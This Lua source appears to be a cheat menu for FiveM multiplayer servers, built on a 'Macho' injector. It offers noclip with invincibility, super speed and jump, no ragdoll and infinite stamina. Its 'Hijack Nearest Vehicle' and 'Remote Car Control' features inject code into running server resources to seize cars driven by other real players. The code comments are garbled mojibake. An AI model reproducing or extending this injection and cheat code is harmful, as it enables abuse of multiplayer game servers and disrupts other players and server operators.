CreateThread(function()
    local me = PlayerPedId()
    local isInVehicle = false
    local shakeCounter = 0

    while true do
        Wait(0)

        local vehicle = GetVehiclePedIsIn(me, false)
        isInVehicle = vehicle ~= nil and vehicle ~= 0

        noclipSpeed = pendingNoclipSpeed

        if speedChangePending and isNoclipEnabled then
            local currentTime = GetGameTimer()
            if currentTime - speedChangeTimer >= 500 then
                isNoclipEnabled = false
                ClearPedTasks(me)
                Wait(0)
                isNoclipEnabled = true
                TaskSkyDive(me)
                speedChangePending = false
            end
        end

        if isNoclipEnabled then
            shakeCounter = shakeCounter + 1
            if shakeCounter >= 10 then
                StopGameplayCamShaking(true)
                ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
                shakeCounter = 0
            end

            FreezeEntityPosition(me, true, false)
            SetEntityInvincible(me, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, true)
            end

            if not isInVehicle then
                local x, y, z = table.unpack(GetEntityCoords(me, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                SetEntityVelocity(me, 0.0, 0.0, 0.0)

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                SetEntityHeading(me, heading)
            else
                local x, y, z = table.unpack(GetEntityCoords(vehicle, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(vehicle)
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(vehicle, x, y, z, true, true, true)
                SetEntityHeading(vehicle, heading)
            end
        else
            SetEntityInvincible(me, false)
            FreezeEntityPosition(me, false, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, false)
            end
        end
    end
end)
local superSpeedLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Fast run", 
   function()
       superSpeedLoop = true
       MachoMenuNotification("Fast run", "Activated")
       
       Citizen.CreateThread(function()
           while superSpeedLoop do
               local playerPed = PlayerPedId()
               SetRunSprintMultiplierForPlayer(PlayerId(), 3.0)
               SetSwimMultiplierForPlayer(PlayerId(), 3.0)
               SetPedMoveRateOverride(playerPed, 2.5)
               
               -- Alternative speed boost
               if IsPedRunning(playerPed) or IsPedSprinting(playerPed) then
                   local forwardVector = GetEntityForwardVector(playerPed)
                   local velocity = GetEntityVelocity(playerPed)
                   SetEntityVelocity(playerPed, 
                       velocity.x + forwardVector.x * 0.5, 
                       velocity.y + forwardVector.y * 0.5, 
                       velocity.z
                   )
               end
               
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
           SetSwimMultiplierForPlayer(PlayerId(), 1.0)
           SetPedMoveRateOverride(playerPed, 1.0)
       end)
   end,
   function()
       superSpeedLoop = false
       MachoMenuNotification("Fast run", "Deactivated")
   end
)
local superJumpLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Super Jump", 
    function()
        superJumpLoop = true
        MachoMenuNotification("Super Jump", "Activated")
        
        Citizen.CreateThread(function()
            while superJumpLoop do
                SetSuperJumpThisFrame(PlayerId())
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        superJumpLoop = false
        MachoMenuNotification("Super Jump", "Deactivated")
    end
)
MachoMenuCheckbox(glovalGeneralRightBottom, "No Ragdoll", 
  function()
      fullNoRagdollLoop = true
      MachoMenuNotification("Full No Ragdoll", "Activated")
      
      Citizen.CreateThread(function()
          while fullNoRagdollLoop do
              local playerPed = PlayerPedId()
              
              -- ØªØ¹Ø·ÙŠÙ„ ÙƒØ§Ù…Ù„ Ù„Ø¬Ù…ÙŠØ¹ Ø£Ù†ÙˆØ§Ø¹ Ragdoll
              SetPedConfigFlag(playerPed, 33, true)
              SetPedConfigFlag(playerPed, 461, true)   -- DieWhenRagdoll
              SetPedConfigFlag(playerPed, 89, true)   -- DontActivateRagdollFromAnyPedImpact
              SetPedConfigFlag(playerPed, 106, true)  -- DontActivateRagdollFromVehicleImpact
              SetPedConfigFlag(playerPed, 107, true)  -- DontActivateRagdollFromBulletImpact
              SetPedConfigFlag(playerPed, 108, true)  -- DontActivateRagdollFromExplosions
              SetPedConfigFlag(playerPed, 109, true)  -- DontActivateRagdollFromFire
              SetPedConfigFlag(playerPed, 110, true)  -- DontActivateRagdollFromElectrocution
              SetPedConfigFlag(playerPed, 160, true)  -- DontActivateRagdollFromImpactObject
              SetPedConfigFlag(playerPed, 161, true)  -- DontActivateRagdollFromMelee
              SetPedConfigFlag(playerPed, 162, true)  -- DontActivateRagdollFromWaterJet
              SetPedConfigFlag(playerPed, 163, true)  -- DontActivateRagdollFromDrowning
              SetPedConfigFlag(playerPed, 164, true)  -- DontActivateRagdollFromFalling
              SetPedConfigFlag(playerPed, 165, true)  -- DontActivateRagdollFromRubberBullet
              SetPedConfigFlag(playerPed, 198, true)
              SetPedConfigFlag(playerPed, 314, true)  -- DontActivateRagdollOnPedCollisionWhenDead
              SetPedConfigFlag(playerPed, 199, true)  -- DontActivateRagdollOnVehicleCollisionWhenDead
              SetPedConfigFlag(playerPed, 235, true)  -- AllowBlockDeadPedRagdollActivation
              SetPedConfigFlag(playerPed, 260, true)  -- SuppressLowLODRagdollSwitchWhenCorpseSettles
              SetPedConfigFlag(playerPed, 306, true)  -- DontActivateRagdollFromPlayerPedImpact
              SetPedConfigFlag(playerPed, 307, true)  -- DontActivateRagdollFromAiRagdollImpact
              SetPedConfigFlag(playerPed, 308, true)  -- DontActivateRagdollFromPlayerRagdollImpact
              SetPedConfigFlag(playerPed, 336, true)  -- DontActivateRagdollForVehicleGrab
              SetPedConfigFlag(playerPed, 367, true)
              SetPedConfigFlag(playerPed, 301, true)  -- DontActivateRagdollFromSmokeGrenade
              
              -- ØªØ¹Ø·ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù‚Ø¯Ø±Ø§Øª Ø¹Ù„Ù‰ Ragdoll
              SetPedConfigFlag(playerPed, 151, false) -- CanActivateRagdollWhenVehicleUpsideDown
              SetPedConfigFlag(playerPed, 227, false) -- ForceRagdollUponDeath
              SetPedConfigFlag(playerPed, 287, false) -- RagdollingOnBoat
              SetPedConfigFlag(playerPed, 318, false) -- ActivateRagdollFromMinorPlayerContact
              SetPedConfigFlag(playerPed, 460, false) -- RagdollFloatsIndefinitely
              
              -- ØªØ¹Ø·ÙŠÙ„ Ù…Ø¨Ø§Ø´Ø± ÙˆÙ†Ù‡Ø§Ø¦ÙŠ
              SetPedCanRagdoll(playerPed, false)
              SetPedCanRagdollFromPlayerImpact(playerPed, false)
              
              -- Ù…Ù†Ø¹ Ø£ÙŠ ragdoll Ù‚Ø³Ø±ÙŠ
              if IsPedRagdoll(playerPed) then
                  SetPedToRagdoll(playerPed, 0, 0, 0, false, false, false)
              end
              
              Citizen.Wait(50) -- ØªØ­Ø¯ÙŠØ« Ø³Ø±ÙŠØ¹ Ø¬Ø¯Ø§Ù‹
          end
          
          -- Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ragdoll Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠ Ø¹Ù†Ø¯ Ø§Ù„ØªØ¹Ø·ÙŠÙ„
          local playerPed = PlayerPedId()
          SetPedCanRagdoll(playerPed, true)
          SetPedCanRagdollFromPlayerImpact(playerPed, true)
          
          -- Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙÙ„Ø§Ù‚Ø§Øª Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
          SetPedConfigFlag(playerPed, 33, false)
          SetPedConfigFlag(playerPed, 89, false)
          SetPedConfigFlag(playerPed, 106, false)
          SetPedConfigFlag(playerPed, 107, false)
          SetPedConfigFlag(playerPed, 314, false)
          SetPedConfigFlag(playerPed, 108, false)
          SetPedConfigFlag(playerPed, 109, false)
          SetPedConfigFlag(playerPed, 110, false)
          SetPedConfigFlag(playerPed, 151, true)
          SetPedConfigFlag(playerPed, false, true)
          SetPedConfigFlag(playerPed, 160, false)
          SetPedConfigFlag(playerPed, 161, false)
          SetPedConfigFlag(playerPed, 162, false)
          SetPedConfigFlag(playerPed, 163, false)
          SetPedConfigFlag(playerPed, 164, false)
          SetPedConfigFlag(playerPed, 165, false)
          SetPedConfigFlag(playerPed, 198, false)
          SetPedConfigFlag(playerPed, 199, false)
          SetPedConfigFlag(playerPed, 227, true)
          SetPedConfigFlag(playerPed, 235, false)
          SetPedConfigFlag(playerPed, 461, false)
          SetPedConfigFlag(playerPed, 260, false)
          SetPedConfigFlag(playerPed, 287, true)
          SetPedConfigFlag(playerPed, 306, false)
          SetPedConfigFlag(playerPed, 307, false)
          SetPedConfigFlag(playerPed, 308, false)
          SetPedConfigFlag(playerPed, 318, true)
          SetPedConfigFlag(playerPed, 336, false)
          SetPedConfigFlag(playerPed, 367, false)
          SetPedConfigFlag(playerPed, 460, true)
      end)
  end,
  function()
      fullNoRagdollLoop = false
      MachoMenuNotification("No Ragdoll", "Deactivated")
  end
)
local staminaLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Infinite Stamina", 
    function()
        staminaLoop = true
        MachoMenuNotification("Infinite Stamina", "Activated")
        
        Citizen.CreateThread(function()
            while staminaLoop do
                RestorePlayerStamina(PlayerId(), 1.0)
                Citizen.Wait(100)
            end
        end)
    end,
    function()
        staminaLoop = false
        MachoMenuNotification("Infinite Stamina", "Deactivated")
    end
)

    
    local SectionChildWidth = MenuSize.x - TabsBarWidth
    local EachSectionWidth = (SectionChildWidth - 20) / 2 -- Adjusted for two sections

    local destroyer = MachoMenuAddTab(MenuWindow, "Vehicle")
    local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

    local oyer = MachoMenuGroup(destroyer, "Vehicle & Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

        local VehicleCheck = MachoMenuGroup(destroyer, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
        
        
-- RGB Vehicle Color System
local redValue = 255
local greenValue = 255
local blueValue = 255

-- Function to apply colors automatically
local function applyRGBColor()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Apply RGB colors to vehicle
        SetVehicleCustomPrimaryColour(vehicle, redValue, greenValue, blueValue)
        SetVehicleCustomSecondaryColour(vehicle, redValue, greenValue, blueValue)
    end
end


-- Red Slider
local RedSlider = MachoMenuSlider(oyer, "Red", 255, 0, 255, "%", 0, function(Value)
    redValue = math.floor(Value)
    applyRGBColor()
end)

-- Green Slider
local GreenSlider = MachoMenuSlider(oyer, "Green", 255, 0, 255, "%", 0, function(Value)
    greenValue = math.floor(Value)
    applyRGBColor()
end)

-- Blue Slider
local BlueSlider = MachoMenuSlider(oyer, "Blue", 255, 0, 255, "%", 0, function(Value)
    blueValue = math.floor(Value)
    applyRGBColor()
end)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(outfitChangeInterval) -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ø¯Ø© Ø§Ù„Ù„ÙŠ Ø­Ø¯Ø¯Ù‡Ø§ Ø§Ù„Ù„Ø§Ø¹Ø¨

        if enableRandomOutfit and NetworkIsPlayerActive(PlayerId()) then
            local newPed = PlayerPedId()
            local success, error = pcall(function()
                -- ØªØºÙŠÙŠØ± Ù…ÙƒÙˆÙ†Ø§Øª Ø§Ù„Ù…Ù„Ø§Ø¨Ø³ Ø¨Ø´ÙƒÙ„ Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)   -- Ø§Ù„Ù‚Ù…ÙŠØµ
                SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) -- Ø§Ù„Ø¬Ø§ÙƒÙŠØª/Ø§Ù„Ø·Ø¨Ù‚Ø© Ø§Ù„Ø¹Ù„ÙˆÙŠØ©
                SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   -- Ø§Ù„Ø°Ø±Ø§Ø¹ÙŠÙ†
                SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   -- Ø§Ù„Ø¨Ù†Ø·Ù„ÙˆÙ†
                SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   -- Ø§Ù„Ø£Ø­Ø°ÙŠØ©

                -- ØªØºÙŠÙŠØ± Ø§Ù„Ø¥ÙƒØ³Ø³ÙˆØ§Ø±Ø§Øª
                SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) -- Ø§Ù„Ù‚Ø¨Ø¹Ø©
                SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true) -- Ø§Ù„Ù†Ø¸Ø§Ø±Ø§Øª
            end)

            if not success then
            end
        end
    end
end)
-- Rainbow Vehicle Color
local RainbowCar = false

-- Rainbow color function
local function getRainbowColor()
    local time = GetGameTimer() / 1000 -- Get time in seconds
    local speed = 2.0 -- Speed of color change
    
    local r = math.floor((math.sin(time * speed) * 127) + 128)
    local g = math.floor((math.sin(time * speed + 2) * 127) + 128)
    local b = math.floor((math.sin(time * speed + 4) * 127) + 128)
    
    return {r = r, g = g, b = b}
end



MachoMenuText(oyer,"Vehicle Control")

local selectedKey = 0

local selectedFlip = "Flip 1" -- ØªØ¹Ø±ÙŠÙ Ø§ÙØªØ±Ø§Ø¶ÙŠ

MachoMenuDropDown(oyer, "Select Flip", function(selectedIndex)
    if selectedIndex == 0 then
        selectedFlip = "Flip 1"
    elseif selectedIndex == 1 then
        selectedFlip = "Flip 2"
    end
end, "Flip 1", "Flip 2")

MachoMenuButton(oyer, "Flip", function()
    local playerPed = PlayerPedId()
    if not DoesEntityExist(playerPed) then return end

    if IsPedSittingInAnyVehicle(playerPed) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        if DoesEntityExist(vehicle) then
            if selectedFlip == "Flip 1" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 1 applied!")
            elseif selectedFlip == "Flip 2" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 2 applied!")
            end
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be inside a vehicle!")
    end
end)

-- Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø© ÙÙŠÙ‡Ø§ Ø´Ø®Øµ Ø­Ù‚ÙŠÙ‚ÙŠ
local function GetNearestVehicleWithPlayer()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local nearestVehicle = nil
    local nearestDistance = math.huge
    
    -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù‚Ø±ÙŠØ¨Ø©
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        
        -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø³Ø§Ø¦Ù‚ ÙÙŠ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
        local driverPed = GetPedInVehicleSeat(vehicle, -1)
        if driverPed and driverPed ~= 0 and driverPed ~= playerPed then
            -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ø³Ø§Ø¦Ù‚ Ù„Ø§Ø¹Ø¨ Ø­Ù‚ÙŠÙ‚ÙŠ ÙˆÙ„ÙŠØ³ NPC
            if IsPedAPlayer(driverPed) then
                if distance < nearestDistance then
                    nearestDistance = distance
                    nearestVehicle = vehicle
                end
            end
        end
    end
    
    return nearestVehicle, nearestDistance
end

-- Ø¯Ø§Ù„Ø© ØªØ¹Ø¯Ø§Ø¯ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª
function EnumerateVehicles()
    return coroutine.wrap(function()
        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}

-- Ø²Ø± Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù„Ø³Ø±Ù‚Ø© Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø©
MachoMenuButton(oyer, "Hijack Nearest Vehicle", function()
    local playerPed = PlayerPedId()
    local nearestVehicle, distance = GetNearestVehicleWithPlayer()
    
    if nearestVehicle then
        local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
        
        ClearPedTasksImmediately(playerPed)
        
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local targetVehicle = ]] .. nearestVehicle .. [[
                local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                
                if targetVehicle ~= 0 then
                    SetPedMoveRateOverride(playerPed, 10.0)
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    SetVehicleDoorsLocked(targetVehicle, 1)
                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                    
                    if driverPed then
                        TaskLeaveVehicle(driverPed, targetVehicle, 0)
                    end
                    
                    SetPedMoveRateOverride(playerPed, 3.0)
                    
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    
                    SetPedIntoVehicle(playerPed, targetVehicle, -1)
                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                    
                    SetPedMoveRateOverride(playerPed, 1.0)
                end
            end)
        ]])
        
        MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
    else
        MachoMenuNotification("Error", "No vehicle with player found")
    end
end)

local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://nitwit123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(oyer, "Remote Car Control", 
    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local playerPed = PlayerPedId()
        local targetVehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Check if the player is in a vehicle
        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
            -- Clear the player's tasks immediately
            ClearPedTasksImmediately(playerPed)

            local originalPos = GetEntityCoords(playerPed)
            local originalHeading = GetEntityHeading(playerPed)

            -- Select a random resource to inject the remote control logic
            local targetResource = nil
            local resourcePriority = {"any", "any", "any"}
            local foundResources = {}
            for _, resourceName in ipairs(resourcePriority) do
                if GetResourceState(resourceName) == "started" then
                    table.insert(foundResources, resourceName)
                end
            end
            
            if #foundResources > 0 then
                targetResource = foundResources[math.random(1, #foundResources)]
            else
                local allResources = {}
                for i = 0, GetNumResources() - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if resourceName and GetResourceState(resourceName) == "started" then
                        table.insert(allResources, resourceName)
                    end
                end
                if #allResources > 0 then
                    targetResource = allResources[math.random(1, #allResources)]
                end
            end

            if targetResource then
                -- Create the help menu (DUI) on the local player's machine
                if not GetCurrentResourceName then
                    return
                end
                
                menuDUI = MachoCreateDui(HELP_URL)
                if not menuDUI then
                    MachoMenuNotification("Remote Car", "Failed to create help menu.")
                    return
                end
                Citizen.Wait(1000)
                MachoShowDui(menuDUI)
                menuVisible = true
                
                -- Loop to handle showing/hiding the menu
                Citizen.CreateThread(function()
                    while menuDUI do
                        Citizen.Wait(0)
                        if IsControlJustPressed(0, 167) then -- F6 to toggle menu
                            menuVisible = not menuVisible
                            if menuVisible then
                                MachoShowDui(menuDUI)
                            else
                                MachoHideDui(menuDUI)
                            end
                        end
                    end
                end)
                
                -- Inject the remote control logic into the target resource
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetVehicle = ]] .. targetVehicle .. [[
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(playerPed, targetVehicle, 0)
                            SetPedMoveRateOverride(playerPed, 10.0)
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            -- Wait for control of the vehicle
                            local hasControl = false
                            local timeout = 0
                            while not hasControl and timeout < 200 do
                                Citizen.Wait(10)
                                if NetworkHasControlOfEntity(targetVehicle) then
                                    hasControl = true
                                else
                                    NetworkRequestControlOfEntity(targetVehicle)
                                end
                                timeout = timeout + 1
                            end

                            if not hasControl then
                                MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                SetEntityVisible(playerPed, true, false)
                                return
                            end
                            
                            -- Wait for 0.6 seconds after gaining control
                            Citizen.Wait(600)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)
                            SetEntityAsMissionEntity(playerPed, true, true)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetEntityVisible(playerPed, false, false)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            Citizen.Wait(100)
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            Citizen.Wait(600)
                            ClearPedTasks(playerPed)

                            -- Start full Remote Car system
                            if DoesEntityExist(targetVehicle) then
                                local RemoteCar = {}
                                local isSpectating = false
                                local originalPlayerPed = nil
                                local audioEnabled = true
                                local originalAudioPos = nil
                                local isFlying = false
                                local flightSpeed = 25.0
                                local flightAcceleration = 0.2
                                local isHonking = false
                                local originalLightState = 0

                                RemoteCar.Start = function()
                                    local selectedVehicle = targetVehicle
                                    if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                        return
                                    end
                                    RemoteCar.Entity = selectedVehicle
                                    RemoteCar.OriginalPed = PlayerPedId()
                                    originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                    originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                    local success = pcall(function()
                                        RemoteCar.CreateBotDriver()
                                    end)
                                    if not success then
                                        return
                                    end
                                    RemoteCar.StartSpectate()
                                    RemoteCar.SetupAudioSystem()
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            if isSpectating then
                                                DisableControlAction(0, 30, true)
                                                DisableControlAction(0, 31, true)
                                                DisableControlAction(0, 21, true)
                                                DisableControlAction(0, 22, true)
                                                DisableControlAction(0, 44, true)
                                                DisableControlAction(0, 55, true)
                                                DisableControlAction(0, 76, true)
                                                DisableControlAction(0, 23, true)
                                                DisableControlAction(0, 75, true)
                                                DisableControlAction(0, 101, true)
                                                DisableControlAction(0, 102, true)
                                                DisableControlAction(0, 0, true)
                                                DisableControlAction(0, 140, true)
                                                DisableControlAction(0, 141, true)
                                                DisableControlAction(0, 142, true)
                                                DisableControlAction(0, 143, true)
                                                DisableControlAction(0, 263, true)
                                                DisableControlAction(0, 264, true)
                                                DisableControlAction(0, 24, true)
                                                DisableControlAction(0, 25, true)
                                                EnableControlAction(0, 172, true)
                                                EnableControlAction(0, 173, true)
                                                EnableControlAction(0, 174, true)
                                                EnableControlAction(0, 175, true)
                                                EnableControlAction(0, 32, true)
                                                EnableControlAction(0, 33, true)
                                                EnableControlAction(0, 34, true)
                                                EnableControlAction(0, 35, true)
                                                EnableControlAction(0, 22, true)
                                                EnableControlAction(0, 21, true)
                                                EnableControlAction(0, 47, true)
                                                EnableControlAction(0, 73, true)
                                                EnableControlAction(0, 246, true)
                                                EnableControlAction(0, 44, true)
                                                EnableControlAction(0, 48, true)
                                                EnableControlAction(0, 108, true)
                                                EnableControlAction(0, 23, true)
                                                EnableControlAction(0, 51, true)
                                            end
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local distance = GetDistanceBetweenCoords(
                                                    GetEntityCoords(RemoteCar.OriginalPed),
                                                    GetEntityCoords(RemoteCar.Entity),
                                                    true
                                                )
                                                pcall(function()
                                                    RemoteCar.HandleKeys(distance)
                                                end)
                                                local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                if vehicleCoords then
                                                    SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                end
                                                if distance <= 2000.0 then
                                                    if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                        NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                    end
                                                    if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                        NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                    end
                                                else
                                                    pcall(function()
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end)
                                                end
                                            else
                                                break
                                            end
                                        end
                                        pcall(function()
                                            RemoteCar.Stop()
                                            ClearFocus()
                                        end)
                                    end)
                                end

                                RemoteCar.SetupAudioSystem = function()
                                    audioEnabled = true
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(100)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.UpdateAudioPosition = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
